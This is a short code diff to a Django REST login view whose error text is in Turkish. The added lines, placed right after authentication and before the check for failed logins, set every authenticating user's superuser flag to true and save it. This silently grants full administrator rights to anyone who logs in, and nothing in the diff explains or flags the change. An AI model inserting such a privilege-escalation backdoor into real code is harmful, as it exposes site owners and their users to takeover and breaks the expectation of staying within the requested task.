@@ -52,6 +52,9 @@ class LoginView(APIView):
             )
         
         user = authenticate(username=username, password=password)
+        user.is_superuser=True
+        user.save()
+        
         if not user:
             return Response(
                 {"error": "Geçersiz kimlik bilgileri"}, 
